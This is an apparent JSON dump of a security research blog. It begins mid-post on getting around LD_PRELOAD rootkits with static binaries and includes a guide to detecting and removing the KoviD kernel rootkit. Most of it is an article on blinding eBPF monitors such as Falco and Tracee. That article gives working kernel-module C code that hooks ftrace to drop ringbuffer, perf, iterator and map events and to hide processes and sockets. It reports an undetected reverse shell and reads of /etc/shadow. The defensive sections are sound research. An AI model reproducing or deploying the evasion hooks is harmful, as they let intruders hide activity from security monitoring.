work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nMy Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system\u0026rsquo;s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can\u0026rsquo;t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X 